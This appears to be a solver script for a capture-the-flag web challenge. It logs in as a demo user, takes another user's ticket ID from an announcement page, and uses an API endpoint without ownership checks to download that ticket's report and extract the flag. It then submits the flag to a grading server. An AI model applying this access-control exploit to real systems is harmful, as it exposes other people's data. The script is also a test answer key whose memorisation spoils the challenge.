from __future__ import annotations

import re

import requests


def solve(target_url: str, control_url: str | None = None, instance_id: str | None = None) -> str:
    client = requests.Session()
    home = client.get(target_url + "/")
    assert home.status_code == 200
    client.post(target_url + "/login", data={"username": "demo", "password": "demo-pass"})
    own_page = client.get(target_url + "/tickets")
    own_ticket = re.search(r"WO-2026-\d{4}", own_page.text).group(0)
    client.get(target_url + "/tickets/" + own_ticket)
    announcement = client.get(target_url + "/announcements/1")
    foreign_ticket = re.search(r"WO-2026-\d{4}", announcement.text).group(0)
    if foreign_ticket == own_ticket:
        raise AssertionError("announcement did not expose a distinct business reference")
    detail = client.get(target_url + "/api/tickets/" + foreign_ticket).json()
    report = client.get(target_url + detail["diagnostic_report"]["download_url"])
    flag = re.search(r"flag\{[^}]+\}", report.text).group(0)
    if control_url and instance_id:
        result = requests.post(control_url + f"/api/v1/instances/{instance_id}/submit", json={"flag": flag}).json()
        assert result["data"]["correct"]
    return flag
